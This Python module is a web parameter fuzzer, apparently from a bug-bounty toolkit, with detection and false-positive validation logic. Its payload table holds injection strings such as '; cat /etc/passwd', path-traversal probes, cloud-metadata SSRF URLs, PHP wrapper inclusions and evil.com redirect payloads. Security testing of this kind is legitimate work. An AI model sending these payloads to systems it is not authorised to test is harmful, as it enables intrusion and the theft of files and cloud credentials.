#!/usr/bin/env python3
"""
Parameter Fuzzer Module
Tests URL parameters for common vulnerabilities:
- Reflected XSS
- SQL Injection indicators
- SSRF patterns
- Path Traversal
- Open Redirects
- Command Injection indicators

Uses safe, non-destructive payloads to detect reflection and error responses.
Includes false positive detection to filter out auth redirects, soft 404s, etc.
"""

import re
import json
import time
import threading
import hashlib
from dataclasses import dataclass, field
from typing import List, Set, Dict, Optional, Tuple, Callable
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, urlunparse
from datetime import datetime

try:
    import requests
except ImportError:
    print("ERROR: requests library required. Install with: pip install requests")
    exit(1)

from utils.config import get_amazon_config, get_shopify_config
from analysis.false_positive_detector import FalsePositiveDetector, RedirectTracker


@dataclass
class FuzzResult:
    """Result of fuzzing a parameter"""
    url: str
    parameter: str
    vuln_type: str
    payload: str
    evidence: str
    severity: str
    confidence: str  # high, medium, low
    request: str = ""
    response_code: int = 0
    response_snippet: str = ""
    false_positive_check: str = ""  # Result of FP analysis
    verified: bool = True  # Whether finding passed FP checks


@dataclass
class FuzzSummary:
    """Summary of fuzzing results"""
    target: str
    parameters_tested: int = 0
    total_requests: int = 0
    findings: List[FuzzResult] = field(default_factory=list)
    errors: List[str] = field(default_factory=list)
    fuzz_time: str = field(default_factory=lambda: datetime.utcnow().isoformat())


# Safe test payloads - designed to detect vulnerabilities without causing harm
# Each payload config includes enhanced detection with FP-aware validation
FUZZ_PAYLOADS = {
    "xss": {
        "payloads": [
            # Reflection detection
            "<xss_test_{{CANARY}}>",
            "'\"><xss_test_{{CANARY}}>",
            "javascript:xss_test_{{CANARY}}//",
            # Event handlers
            "'\"><img src=x onerror=xss_{{CANARY}}>",
            # Template injection probe
            "{{7*7}}",
            "${7*7}",
            "<%=7*7%>",
        ],
        "detect": lambda resp, canary: _detect_xss(resp, canary),
        "validate": lambda resp, payload, canary: _validate_xss(resp, payload, canary),
        "severity": "high",
        "requires_html": True,
    },
    "sqli": {
        "payloads": [
            # Error-based detection
            "'",
            "\"",
            "' OR '1'='1",
            "1' AND '1'='1",
            "1 UNION SELECT NULL--",
            # Time-based canary (won't actually delay)
            "1' AND SLEEP(0)--",
            # Boolean-based
            "1 AND 1=1",
            "1 AND 1=2",
        ],
        "detect": lambda resp, _: _detect_sqli(resp),
        "validate": lambda resp, payload, _: _validate_sqli(resp, payload),
        "severity": "critical",
        "requires_html": False,
    },
    "ssrf": {
        "payloads": [
            # Localhost variations
            "http://127.0.0.1",
            "http://localhost",
            "http://[::1]",
            "http://127.0.0.1:80",
            "http://127.0.0.1:443",
            # Cloud metadata (safe - will just fail if no SSRF)
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/",
            # DNS rebinding probe
            "http://localtest.me",
        ],
        "detect": lambda resp, _: _detect_ssrf(resp),
        "validate": lambda resp, payload, _: _validate_ssrf(resp, payload),
        "severity": "high",
        "requires_html": False,
    },
    "path_traversal": {
        "payloads": [
            # Basic traversal
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "....//....//....//etc/passwd",
            # Encoded versions
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc/passwd",
            # Null byte (legacy)
            "../../../etc/passwd%00",
        ],
        "detect": lambda resp, _: _detect_path_traversal(resp),
        "validate": lambda resp, payload, _: _validate_path_traversal(resp),
        "severity": "critical",
        "requires_html": False,
    },
    "open_redirect": {
        "payloads": [
            "//evil.com",
            "https://evil.com",
            "/\\evil.com",
            "//evil.com/%2f..",
            "///evil.com",
            "////evil.com",
            "https:evil.com",
        ],
        "detect": lambda resp, _: _detect_open_redirect(resp),
        "validate": lambda resp, payload, _: _validate_open_redirect(resp, payload),
        "severity": "medium",
        "requires_html": False,
    },
    "command_injection": {
        "payloads": [
            # Safe detection only - won't execute
            "|echo cmd_test_{{CANARY}}",
            ";echo cmd_test_{{CANARY}}",
            "`echo cmd_test_{{CANARY}}`",
            "$(echo cmd_test_{{CANARY}})",
            # Error indicators
            "| ls",
            "; cat /etc/passwd",
        ],
        "detect": lambda resp, canary: _detect_cmdi(resp, canary),
        "validate": lambda resp, payload, canary: _validate_cmdi(resp, payload, canary),
        "severity": "critical",
        "requires_html": False,
    },
    "lfi": {
        "payloads": [
            # PHP wrappers
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input",
            "data://text/plain,<?php phpinfo();?>",
            # Log injection
            "/var/log/apache2/access.log",
            "/var/log/nginx/access.log",
        ],
        "detect": lambda resp, _: _detect_lfi(resp),
        "validate": lambda resp, payload, _: _validate_lfi(resp, payload),
        "severity": "critical",
        "requires_html": False,
    },
    "xxe": {
        "payloads": [
            # XXE probe (won't work unless app parses XML)
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe "xxe_test_{{CANARY}}">]><foo>&xxe;</foo>',
        ],
        "detect": lambda resp, canary: f"xxe_test_{canary}" in resp.text,
        "validate": lambda resp, payload, canary: _validate_xxe(resp, canary),
        "severity": "critical",
        "requires_html": False,
    },
    "ssti": {
        "payloads": [
            # Template injection probes
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "{{constructor.constructor('return this')()}}",
            "${T(java.lang.Runtime)}",
            "<%= 7*7 %>",
            "{php}echo 7*7;{/php}",
        ],
        "detect": lambda resp, _: _detect_ssti(resp),
        "validate": lambda resp, payload, _: _validate_ssti(resp, payload),
        "severity": "critical",
        "requires_html": True,
    },
}


# Enhanced detection functions with context awareness
def _detect_xss(resp: requests.Response, canary: str) -> bool:
    """Detect XSS reflection with basic check"""
    if not resp or not resp.text:
        return False
    return canary in resp.text or "<xss_test_" in resp.text


def _validate_xss(resp: requests.Response, payload: str, canary: str) -> Tuple[bool, str]:
    """Validate XSS is real, not escaped/encoded"""
    content = resp.text

    # Check if canary/payload is present
    search_term = canary if canary in content else payload
    if search_term not in content:
        return False, "Payload not reflected"

    # Check if in HTML comment
    # HTML comments: <!-- ... --> (can contain any chars except -->)
    if re.search(r'<!--.*?' + re.escape(search_term) + r'.*?-->', content, re.DOTALL):
        return False, "Payload in HTML comment"

    # Check if HTML-encoded
    if '&lt;' + search_term.replace('<', '') in content:
        return False, "Payload is HTML-encoded"

    # Check if URL-encoded
    if '%3c' + search_term.replace('<', '').lower() in content.lower():
        return False, "Payload is URL-encoded"

    # Check if in JavaScript string (escaped)
    if re.search(r'["\'][^"\']*\\x3c[^"\']*' + re.escape(search_term.replace('<', '')), content):
        return False, "Payload escaped in JS string"

    return True, "XSS reflection confirmed"


def _detect_sqli(resp: requests.Response) -> bool:
    """Detect SQL injection errors"""
    if not resp or not resp.text:
        return False

    content = resp.text.lower()

    # SQL error patterns with context
    error_patterns = [
        r'you have an error in your sql syntax',
        r'warning:.*mysql',
        r'unclosed quotation mark',
        r'quoted string not properly terminated',
        r'pg_query\(\):',
        r'pg_exec\(\):',
        r'ora-\d{5}',
        r'microsoft.*odbc.*sql server',
        r'syntax error.*at or near',
        r'invalid.*sql.*statement',
    ]

    return any(re.search(pattern, content) for pattern in error_patterns)


def _validate_sqli(resp: requests.Response, payload: str) -> Tuple[bool, str]:
    """Validate SQL injection is real, not FP from tech mentions"""
    content = resp.text.lower()

    # False positive patterns - mentions without errors
    fp_patterns = [
        r'powered\s+by\s+(?:mysql|postgresql|oracle|mssql)',
        r'database:\s+(?:mysql|postgresql)',
        r'copyright.*(?:mysql|oracle)',
        r'<footer.*(?:mysql|postgresql|oracle)',
        r'<!--.*(?:mysql|postgresql|oracle).*-->',
    ]

    # Check for FP patterns
    for pattern in fp_patterns:
        if re.search(pattern, content):
            # If it's just a mention without actual error syntax
            if not re.search(r'(?:error|warning|exception).*(?:sql|query|syntax)', content):
                return False, "Tech mention without error"

    # Must have actual error indicators
    real_error_patterns = [
        r'sql\s+syntax.*error',
        r'syntax\s+error.*sql',
        r'unclosed\s+quotation',
        r'unterminated.*string',
        r'invalid.*query',
        r'\d{4,5}.*error',  # Error codes
    ]

    if any(re.search(pattern, content) for pattern in real_error_patterns):
        return True, "SQL error confirmed"

    return False, "No confirmed SQL error"


def _detect_ssrf(resp: requests.Response) -> bool:
    """Detect SSRF indicators"""
    if not resp or not resp.text:
        return False

    indicators = [
        'ami-id', 'instance-id', 'local-ipv4', 'meta-data',
        'iam/security-credentials', 'computeMetadata',
    ]

    return any(ind in resp.text for ind in indicators)


def _validate_ssrf(resp: requests.Response, payload: str) -> Tuple[bool, str]:
    """Validate SSRF response is from internal service, not error page"""
    content = resp.text

    # Check for actual metadata content format
    if '169.254.169.254' in payload:
        # AWS metadata format
        if re.search(r'ami-id|instance-type|local-ipv4|iam/', content):
            return True, "AWS metadata access confirmed"

    if 'metadata.google.internal' in payload:
        # GCP metadata format
        if re.search(r'computeMetadata|project-id|instance/zone', content):
            return True, "GCP metadata access confirmed"

    # Check if response is just an error mentioning the IP
    error_patterns = [
        r'cannot connect to',
        r'connection refused',
        r'connection timed out',
        r'no route to host',
        r'could not resolve',
    ]

    if any(re.search(pattern, content.lower()) for pattern in error_patterns):
        return False, "Connection error, not SSRF"

    return False, "No confirmed metadata access"


def _detect_path_traversal(resp: requests.Response) -> bool:
    """Detect path traversal success indicators"""
    if not resp or not resp.text:
        return False

    indicators = [
        'root:x:', 'root:*:', 'daemon:x:',
        '[extensions]', '[fonts]', '[boot loader]',
        '/bin/bash', '/bin/sh',
    ]

    return any(ind in resp.text for ind in indicators)


def _validate_path_traversal(resp: requests.Response) -> Tuple[bool, str]:
    """Validate path traversal shows actual file content"""
    content = resp.text

    # /etc/passwd format validation
    if re.search(r'^[a-z_][a-z0-9_-]*:[x*]:\d+:\d+:', content, re.MULTILINE):
        return True, "passwd file format confirmed"

    # win.ini format validation
    if re.search(r'^\[(extensions|fonts|mci extensions)\]', content, re.IGNORECASE | re.MULTILINE):
        return True, "win.ini format confirmed"

    return False, "No confirmed file content"


def _detect_open_redirect(resp: requests.Response) -> bool:
    """Detect open redirect"""
    if not resp:
        return False

    # Check for redirect status codes
    if resp.status_code in [301, 302, 303, 307, 308]:
        location = resp.headers.get('Location', '')
        if 'evil.com' in location:
            return True

    return False


def _validate_open_redirect(resp: requests.Response, payload: str) -> Tuple[bool, str]:
    """Validate open redirect points to external domain"""
    if resp.status_code not in [301, 302, 303, 307, 308]:
        return False, "Not a redirect response"

    location = resp.headers.get('Location', '')
    if not location:
        return False, "No Location header"

    # Parse the location to check domain
    if location.startswith('//'):
        location = 'https:' + location

    try:
        parsed = urlparse(location)
        if parsed.netloc and 'evil.com' in parsed.netloc:
            return True, f"Redirect to external domain: {parsed.netloc}"
    except Exception:
        pass

    # Check for protocol-relative or malformed redirects
    if 'evil.com' in location:
        return True, f"Redirect contains evil.com: {location}"

    return False, "Redirect not to external domain"


def _detect_cmdi(resp: requests.Response, canary: str) -> bool:
    """Detect command injection"""
    if not resp or not resp.text:
        return False

    content = resp.text.lower()

    # Check for canary
    if f"cmd_test_{canary}" in resp.text:
        return True

    # Check for error patterns that suggest command was parsed
    error_patterns = [
        r'sh:\s*\d*:',
        r'bash:.*:',
        r'/bin/.*:',
        r'command not found',
        r'syntax error',
        r'permission denied',
    ]

    return any(re.search(pattern, content) for pattern in error_patterns)


def _validate_cmdi(resp: requests.Response, payload: str, canary: str) -> Tuple[bool, str]:
    """Validate command injection evidence"""
    content = resp.text

    # Direct canary output
    if f"cmd_test_{canary}" in content:
        return True, "Command output reflected"

    # Check if error is from shell, not app
    shell_errors = [
        r'sh:\s*\d*:.*not found',
        r'bash:.*command not found',
        r'/bin/.*:.*not found',
    ]

    if any(re.search(pattern, content.lower()) for pattern in shell_errors):
        return True, "Shell error indicates command parsing"

    return False, "No confirmed command execution"


def _detect_lfi(resp: requests.Response) -> bool:
    """Detect LFI indicators"""
    if not resp or not resp.text:
        return False

    indicators = [
        'PD9waHA',  # Base64 <?php
        '<?php',
        'phpinfo()',
        'PHP Version',
    ]

    return any(ind in resp.text for ind in indicators)


def _validate_lfi(resp: requests.Response, payload: str) -> Tuple[bool, str]:
    """Validate LFI shows actual file content"""
    content = resp.text

    # PHP wrapper base64 output
    if 'php://filter' in payload and 'PD9waHA' in content:
        return True, "PHP source via filter wrapper"

    # phpinfo() output
    if re.search(r'<title>phpinfo\(\)</title>', content):
        return True, "phpinfo() output confirmed"

    # Log file patterns
    if re.search(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}.*(?:GET|POST|HEAD)', content):
        return True, "Log file content confirmed"

    return False, "No confirmed file inclusion"


def _detect_ssti(resp: requests.Response) -> bool:
    """Detect SSTI with basic check"""
    if not resp or not resp.text:
        return False

    return '49' in resp.text or 'java.lang.Runtime' in resp.text


def _validate_ssti(resp: requests.Response, payload: str) -> Tuple[bool, str]:
    """Validate SSTI - ensure '49' is from template execution"""
    content = resp.text

    # Check for java.lang.Runtime (more reliable)
    if 'java.lang.Runtime' in content:
        return True, "Java class reflection in response"

    # For '49', need to verify it's from template execution
    if '49' not in content:
        return False, "No template output found"

    # False positive patterns for '49'
    fp_patterns = [
        r'error[:\s]+49',
        r'code[:\s]+49',
        r'page\s+49',
        r'item[:\s#]+49',
        r'id["\']?\s*[:=]\s*["\']?49',
        r'\.49(?:\.|$)',  # Version or extension
        r'\d49\d',  # Part of larger number
        r'49[%$]',  # Percentage or currency
        r'[$]\s*49',  # Currency
        r'#49\b',  # Anchor or ID
        r'v49\b',  # Version
        r'-49\b',  # Negative or suffix
    ]

    # Find all '49' occurrences and check context
    for match in re.finditer(r'(?<![0-9])49(?![0-9])', content):
        start = max(0, match.start() - 30)
        end = min(len(content), match.end() + 30)
        context = content[start:end].lower()

        # Check if this '49' is in a FP context
        is_fp = any(re.search(pattern, context) for pattern in fp_patterns)

        if not is_fp:
            # This '49' might be real SSTI output
            # Additional check: is '49' near our payload or template syntax?
            if re.search(r'[{$<%#].*49|49.*[}%>]', context):
                return True, "Template math execution confirmed"

    return False, "'49' appears in non-template context"


def _validate_xxe(resp: requests.Response, canary: str) -> Tuple[bool, str]:
    """Validate XXE entity expansion"""
    if f"xxe_test_{canary}" in resp.text:
        return True, "XXE entity expanded"
    return False, "XXE entity not expanded"


class ParamFuzzer:
    """Fuzz URL parameters for vulnerabilities with false positive detection"""

    def __init__(self, rate_limit: float = 5.0, user_agent: str = "BugBountyResearcher",
                 enable_fp_detection: bool = True):
        self.rate_limit = rate_limit
        self.min_interval = 1.0 / rate_limit
        self.last_request = 0.0
        self.lock = threading.Lock()
        self.user_agent = user_agent
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        })
        self.request_count = 0

        # False positive detection
        self.enable_fp_detection = enable_fp_detection
        self.fp_detector = FalsePositiveDetector(self.session, rate_limit) if enable_fp_detection else None
        self.redirect_tracker = RedirectTracker() if enable_fp_detection else None

        # Baseline responses for comparison
        self.baselines: Dict[str, requests.Response] = {}

        # Statistics
        self.stats = {
            'total_detections': 0,
            'false_positives_filtered': 0,
            'verified_findings': 0,
        }

    def _rate_limit_wait(self):
        """Wait to respect rate limit"""
        with self.lock:
            now = time.time()
            elapsed = now - self.last_request
            if elapsed < self.min_interval:
                time.sleep(self.min_interval - elapsed)
            self.last_request = time.time()
            self.request_count += 1

    def _make_request(self, url: str, method: str = "GET",
                      data: Dict = None, follow_redirects: bool = False) -> Optional[requests.Response]:
        """Make a rate-limited request"""
        self._rate_limit_wait()
        try:
            if method.upper() == "POST":
                response = self.session.post(url, data=data, timeout=10, allow_redirects=follow_redirects)
            else:
                response = self.session.get(url, timeout=10, allow_redirects=follow_redirects)

            # Track redirects for FP detection
            if self.redirect_tracker and response.status_code in [301, 302, 303, 307, 308]:
                location = response.headers.get('Location', '')
                if location:
                    self.redirect_tracker.record_redirect(url, location)

            return response
        except:
            return None

    def _get_baseline(self, url: str) -> Optional[requests.Response]:
        """Get or create baseline response for URL"""
        parsed = urlparse(url)
        base_key = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        if base_key not in self.baselines:
            # Request without any fuzz parameters
            baseline_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            self.baselines[base_key] = self._make_request(baseline_url)

        return self.baselines.get(base_key)

    def _check_content_type(self, response: requests.Response, requires_html: bool) -> bool:
        """Check if content type is appropriate for the vulnerability type"""
        if not requires_html:
            return True

        content_type = response.headers.get('Content-Type', '').lower()
        return 'text/html' in content_type or 'application/xhtml' in content_type

    def _is_auth_redirect(self, response: requests.Response) -> bool:
        """Check if response is a redirect to auth/login page"""
        if response.status_code not in [301, 302, 303, 307, 308]:
            return False

        location = response.headers.get('Location', '').lower()
        auth_indicators = ['/login', '/signin', '/auth', '/sso', '/oauth', '/session',
                          '/account', '/access-denied', '/unauthorized']

        return any(ind in location for ind in auth_indicators)

    def _is_error_response(self, response: requests.Response) -> bool:
        """Check if response is an error page"""
        content = response.text.lower() if response.text else ''

        error_indicators = [
            'page not found', '404', 'not found',
            'access denied', 'forbidden', '403',
            'error', 'invalid request',
        ]

        # Check title
        title_match = re.search(r'<title>([^<]+)</title>', content)
        if title_match:
            title = title_match.group(1).lower()
            if any(ind in title for ind in error_indicators):
                return True

        return False

    def _compare_with_baseline(self, response: requests.Response, baseline: requests.Response,
                               threshold: float = 0.95) -> bool:
        """Check if response is too similar to baseline (payload likely not processed)"""
        if not baseline:
            return False

        # Compare lengths
        resp_len = len(response.text) if response.text else 0
        base_len = len(baseline.text) if baseline.text else 0

        if resp_len == 0 or base_len == 0:
            return False

        # Quick length check
        len_ratio = min(resp_len, base_len) / max(resp_len, base_len)
        if len_ratio > threshold:
            # Do more detailed comparison
            from difflib import SequenceMatcher
            similarity = SequenceMatcher(None,
                                         response.text[:2000] if response.text else '',
                                         baseline.text[:2000] if baseline.text else '').ratio()
            return similarity > threshold

        return False

    def _generate_canary(self, url: str, param: str) -> str:
        """Generate a unique canary for this URL/param combo"""
        data = f"{url}:{param}:{time.time()}"
        return hashlib.md5(data.encode()).hexdigest()[:8]

    def _extract_params(self, url: str) -> Dict[str, str]:
        """Extract parameters from URL"""
        parsed = urlparse(url)
        return parse_qs(parsed.query, keep_blank_values=True)

    def _build_url(self, base_url: str, params: Dict[str, str]) -> str:
        """Build URL with modified parameters"""
        parsed = urlparse(base_url)
        # Flatten params (parse_qs returns lists)
        flat_params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
        new_query = urlencode(flat_params)
        return urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, new_query, parsed.fragment
        ))

    def fuzz_parameter(self, url: str, param: str, original_value: str,
                       vuln_types: List[str] = None) -> List[FuzzResult]:
        """Fuzz a single parameter with specified vulnerability types and FP detection"""
        results = []

        if vuln_types is None:
            vuln_types = list(FUZZ_PAYLOADS.keys())

        parsed = urlparse(url)
        base_params = parse_qs(parsed.query, keep_blank_values=True)

        # Get baseline response for comparison
        baseline = self._get_baseline(url) if self.enable_fp_detection else None

        for vuln_type in vuln_types:
            if vuln_type not in FUZZ_PAYLOADS:
                continue

            config = FUZZ_PAYLOADS[vuln_type]
            canary = self._generate_canary(url, param)
            requires_html = config.get("requires_html", False)

            for payload in config["payloads"]:
                # Replace canary placeholder
                test_payload = payload.replace("{{CANARY}}", canary)

                # Build test URL
                test_params = base_params.copy()
                test_params[param] = [test_payload]
                test_url = self._build_url(url, test_params)

                # Make request
                response = self._make_request(test_url)

                if not response:
                    continue

                self.stats['total_detections'] += 1

                # === FALSE POSITIVE CHECKS ===
                if self.enable_fp_detection:
                    # Check 1: Is this a redirect to auth page?
                    if self._is_auth_redirect(response):
                        continue  # Skip - false positive

                    # Check 2: Content-type appropriate for vuln type?
                    if not self._check_content_type(response, requires_html):
                        continue  # Skip - wrong content type

                    # Check 3: Is response too similar to baseline?
                    if baseline and self._compare_with_baseline(response, baseline):
                        continue  # Skip - payload not processed

                    # Check 4: Is this an error page?
                    if self._is_error_response(response) and vuln_type not in ['sqli', 'command_injection']:
                        continue  # Skip - generic error page

                # Check for vulnerability indicators (basic detection)
                detect_func = config["detect"]
                if not detect_func(response, canary):
                    continue

                # === VALIDATION PHASE ===
                # Use enhanced validation to confirm finding
                validate_func = config.get("validate")
                is_verified = True
                validation_msg = "Basic detection"

                if validate_func:
                    is_verified, validation_msg = validate_func(response, test_payload, canary)

                if not is_verified:
                    self.stats['false_positives_filtered'] += 1
                    continue  # Skip - failed validation

                # === ADDITIONAL FP CHECK using detector ===
                fp_check_result = ""
                if self.fp_detector:
                    fp_result = self.fp_detector.analyze_for_false_positive(
                        test_url, response, vuln_type, test_payload
                    )
                    if fp_result.is_false_positive:
                        self.stats['false_positives_filtered'] += 1
                        continue  # Skip - detector identified as FP
                    fp_check_result = fp_result.reason

                # Found verified vulnerability
                self.stats['verified_findings'] += 1

                result = FuzzResult(
                    url=url,
                    parameter=param,
                    vuln_type=vuln_type,
                    payload=test_payload,
                    evidence=validation_msg,
                    severity=config["severity"],
                    confidence="high" if is_verified else "medium",
                    request=f"GET {test_url}",
                    response_code=response.status_code,
                    response_snippet=response.text[:200] if response.text else "",
                    false_positive_check=fp_check_result,
                    verified=is_verified,
                )
                results.append(result)
                break  # Found vuln for this type, move to next

        return results

    def discover_params(self, url: str) -> Set[str]:
        """Discover additional parameters by fuzzing with FP-aware detection"""
        discovered = set()

        # Common parameter names to try
        common_params = [
            'id', 'page', 'search', 'q', 'query', 'term',
            'user', 'username', 'name', 'email', 'password',
            'url', 'redirect', 'next', 'return', 'goto',
            'file', 'path', 'dir', 'folder', 'document',
            'action', 'cmd', 'exec', 'command', 'do',
            'data', 'value', 'input', 'output', 'result',
            'token', 'key', 'api_key', 'apikey', 'auth',
            'callback', 'jsonp', 'format', 'type', 'mode',
            'debug', 'test', 'admin', 'config', 'settings',
            'limit', 'offset', 'sort', 'order', 'filter',
            'from', 'to', 'start', 'end', 'date', 'time',
            'lang', 'language', 'locale', 'country', 'region',
        ]

        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        print(f"    [DISCOVER] Probing for hidden parameters...")

        # First, get baseline response
        baseline = self._make_request(base_url)
        baseline_hash = None
        baseline_len = 0

        if baseline and baseline.text:
            baseline_len = len(baseline.text)
            # Compute normalized hash (ignore dynamic content)
            normalized = re.sub(r'(?:csrf|nonce|token|timestamp|session)["\']?\s*[:=]\s*["\']?[\w\-]+', '',
                               baseline.text, flags=re.IGNORECASE)
            baseline_hash = hashlib.md5(normalized.encode()).hexdigest()

        # Use unique canaries instead of 'test123'/'test456' which might appear naturally
        canary1 = f"paramprobe_{hashlib.md5(f'{url}:1'.encode()).hexdigest()[:6]}"
        canary2 = f"paramprobe_{hashlib.md5(f'{url}:2'.encode()).hexdigest()[:6]}"

        for param in common_params:
            test_url1 = f"{base_url}?{param}={canary1}"
            response1 = self._make_request(test_url1)

            if not response1:
                continue

            # Skip if redirect to auth page (common FP)
            if self.enable_fp_detection and self._is_auth_redirect(response1):
                continue

            # Compare with different value
            test_url2 = f"{base_url}?{param}={canary2}"
            response2 = self._make_request(test_url2)

            if not response2:
                continue

            # Skip if redirect to auth page
            if self.enable_fp_detection and self._is_auth_redirect(response2):
                continue

            # Check for param activity with improved detection
            is_active = False

            # Check 1: Status code difference
            if response1.status_code != response2.status_code:
                is_active = True

            # Check 2: Canary reflection (strong indicator)
            elif canary1 in (response1.text or '') or canary2 in (response2.text or ''):
                is_active = True

            # Check 3: Significant length difference (>5% change from different values)
            elif response1.text and response2.text:
                len1 = len(response1.text)
                len2 = len(response2.text)
                # Response lengths differ between two test values
                if len1 != len2:
                    diff_ratio = abs(len1 - len2) / max(len1, len2)
                    if diff_ratio > 0.05:  # More than 5% difference
                        is_active = True

            # Check 4: Content differs significantly from baseline
            if not is_active and baseline and response1.text:
                # Compare hash with baseline
                normalized1 = re.sub(r'(?:csrf|nonce|token|timestamp|session)["\']?\s*[:=]\s*["\']?[\w\-]+', '',
                                    response1.text, flags=re.IGNORECASE)
                resp1_hash = hashlib.md5(normalized1.encode()).hexdigest()

                if resp1_hash != baseline_hash:
                    # Check if length differs significantly from baseline
                    len_diff = abs(len(response1.text) - baseline_len) / max(baseline_len, 1)
                    if len_diff > 0.1:  # More than 10% diff from baseline
                        is_active = True

            if is_active:
                discovered.add(param)

        print(f"    [DISCOVER] Found {len(discovered)} potentially active parameters")
        return discovered

    def fuzz_url(self, url: str, discover_params: bool = True,
                 vuln_types: List[str] = None) -> FuzzSummary:
        """Fuzz all parameters in a URL"""
        if not url.startswith('http'):
            url = f"https://{url}"

        print(f"\n[*] Parameter Fuzzing: {url}")
        print("=" * 50)

        summary = FuzzSummary(target=url)
        self.request_count = 0

        # Extract existing parameters
        existing_params = self._extract_params(url)
        params_to_test = set(existing_params.keys())

        print(f"    [PARAMS] Found {len(params_to_test)} URL parameters")

        # Discover additional parameters
        if discover_params and not existing_params:
            discovered = self.discover_params(url)
            params_to_test.update(discovered)
            # Add discovered params to URL for testing
            if discovered:
                parsed = urlparse(url)
                new_params = {p: 'test' for p in discovered}
                url = self._build_url(url, new_params)
                existing_params = new_params

        if not params_to_test:
            print("    [!] No parameters to test")
            return summary

        # Fuzz each parameter
        print(f"    [FUZZ] Testing {len(params_to_test)} parameters...")

        for param in params_to_test:
            original_value = existing_params.get(param, [''])[0]
            if isinstance(original_value, list):
                original_value = original_value[0] if original_value else ''

            print(f"      Testing: {param}")
            results = self.fuzz_parameter(url, param, original_value, vuln_types)

            for result in results:
                print(f"        [!] {result.vuln_type.upper()} detected!")
                summary.findings.append(result)

        summary.parameters_tested = len(params_to_test)
        summary.total_requests = self.request_count

        print(f"\n    [SUMMARY] {len(summary.findings)} potential vulnerabilities found")
        print(f"    [SUMMARY] {summary.total_requests} requests made")

        if self.enable_fp_detection:
            print(f"    [FP-FILTER] {self.stats['false_positives_filtered']} false positives filtered")
            print(f"    [FP-FILTER] {self.stats['verified_findings']} verified findings")

        return summary

    def get_stats(self) -> Dict:
        """Get fuzzing statistics including FP detection"""
        stats = dict(self.stats)
        if self.fp_detector:
            stats['fp_detector'] = self.fp_detector.get_stats()
        if self.redirect_tracker:
            stats['redirects'] = self.redirect_tracker.get_redirect_summary()
        return stats

    def reset_stats(self):
        """Reset all statistics"""
        self.stats = {
            'total_detections': 0,
            'false_positives_filtered': 0,
            'verified_findings': 0,
        }
        if self.fp_detector:
            self.fp_detector.reset_stats()


class AmazonParamFuzzer(ParamFuzzer):
    """Amazon VRP-compliant parameter fuzzer with FP detection"""

    def __init__(self, username: str = "yourh1username", enable_fp_detection: bool = True):
        config = get_amazon_config(username)
        super().__init__(
            rate_limit=config.rate_limit,
            user_agent=config.user_agent,
            enable_fp_detection=enable_fp_detection
        )


class ShopifyParamFuzzer(ParamFuzzer):
    """Shopify-compliant parameter fuzzer with FP detection"""

    def __init__(self, username: str = "yourh1username", enable_fp_detection: bool = True):
        config = get_shopify_config(username)
        super().__init__(
            rate_limit=config.rate_limit,
            user_agent=config.user_agent,
            enable_fp_detection=enable_fp_detection
        )


def save_fuzz_results(summary: FuzzSummary, output_file: str, fuzzer_stats: Dict = None):
    """Save fuzzing results to JSON with FP detection stats"""
    data = {
        "target": summary.target,
        "fuzz_time": summary.fuzz_time,
        "parameters_tested": summary.parameters_tested,
        "total_requests": summary.total_requests,
        "vulnerabilities_found": len(summary.findings),
        "findings": [
            {
                "url": f.url,
                "parameter": f.parameter,
                "vuln_type": f.vuln_type,
                "payload": f.payload,
                "evidence": f.evidence,
                "severity": f.severity,
                "confidence": f.confidence,
                "response_code": f.response_code,
                "verified": f.verified,
                "false_positive_check": f.false_positive_check,
            }
            for f in summary.findings
        ],
        "errors": summary.errors,
    }

    # Add FP detection stats if available
    if fuzzer_stats:
        data["false_positive_detection"] = {
            "enabled": True,
            "total_detections": fuzzer_stats.get('total_detections', 0),
            "false_positives_filtered": fuzzer_stats.get('false_positives_filtered', 0),
            "verified_findings": fuzzer_stats.get('verified_findings', 0),
            "filter_rate": f"{(fuzzer_stats.get('false_positives_filtered', 0) / max(fuzzer_stats.get('total_detections', 1), 1) * 100):.1f}%",
        }

        if 'redirects' in fuzzer_stats:
            data["redirect_analysis"] = fuzzer_stats['redirects']

    with open(output_file, 'w') as f:
        json.dump(data, f, indent=2)

    print(f"\n[*] Results saved to: {output_file}")


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Parameter Fuzzer with False Positive Detection")
    parser.add_argument("url", help="Target URL with parameters")
    parser.add_argument("--program", "-p", choices=["amazon", "shopify"],
                        help="Bug bounty program")
    parser.add_argument("--username", "-u", default="yourh1username",
                        help="HackerOne username")
    parser.add_argument("--types", "-t", nargs='+',
                        choices=list(FUZZ_PAYLOADS.keys()),
                        help="Vulnerability types to test")
    parser.add_argument("--no-discover", action="store_true",
                        help="Skip parameter discovery")
    parser.add_argument("--no-fp-detection", action="store_true",
                        help="Disable false positive detection (not recommended)")
    parser.add_argument("--output", "-o", help="Output JSON file")

    args = parser.parse_args()

    enable_fp = not args.no_fp_detection

    # Create fuzzer
    if args.program == "amazon":
        fuzzer = AmazonParamFuzzer(args.username, enable_fp_detection=enable_fp)
    elif args.program == "shopify":
        fuzzer = ShopifyParamFuzzer(args.username, enable_fp_detection=enable_fp)
    else:
        fuzzer = ParamFuzzer(enable_fp_detection=enable_fp)

    if enable_fp:
        print("[*] False Positive Detection: ENABLED")
    else:
        print("[!] False Positive Detection: DISABLED")

    # Run fuzzing
    summary = fuzzer.fuzz_url(
        args.url,
        discover_params=not args.no_discover,
        vuln_types=args.types
    )

    # Print summary
    print("\n" + "=" * 50)
    print("FUZZING SUMMARY")
    print("=" * 50)
    print(f"Target: {summary.target}")
